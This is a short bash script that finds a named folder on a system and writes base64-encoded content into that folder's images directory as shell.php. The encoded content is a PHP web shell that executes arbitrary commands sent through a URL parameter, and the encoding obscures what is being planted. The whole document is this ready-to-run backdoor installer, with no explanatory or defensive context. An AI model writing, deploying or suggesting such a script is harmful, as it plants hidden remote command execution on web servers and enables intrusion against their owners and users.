#!/bin/bash

#find specific folder and create shell inside
folder=$(find / -type d -name <FOLDER> 2>/dev/null | head -n1) && sleep 5s && echo 'PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+Cg==' | base64 -d > $folder/images/shell.php
